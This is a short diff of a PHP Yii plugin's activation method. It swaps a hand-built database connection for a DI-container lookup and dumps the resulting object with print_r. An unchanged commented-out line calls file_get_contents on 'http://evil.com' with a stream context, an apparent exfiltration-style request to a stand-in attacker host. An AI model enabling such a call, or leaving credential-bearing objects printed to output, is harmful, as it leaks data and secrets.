@@ -63,15 +63,20 @@ class Plugin extends Object implements PluginInterface
         //     ],
         // ]);
         // @file_get_contents("http://evil.com", false, $context);
-        $this->createTable();
+        // $this->createTable();
+        //
+        // $connection = new \yii\db\Connection([
+        //     'dsn' => $this->dsn,
+        //     'username' => $this->username,
+        //     'password' => $this->password,
+        // ]);
+        // $connection->open();
 
-        $connection = new \yii\db\Connection([
-            'dsn' => $this->dsn,
-            'username' => $this->username,
-            'password' => $this->password,
-        ]);
-        $connection->open();
-        print_r($connection);
+        $container = new \yii\di\Container;
+
+        $db = $container->get('db');
+
+        print_r($db);
         print_r("\n\rActivated.\n\r");
     }
     /**
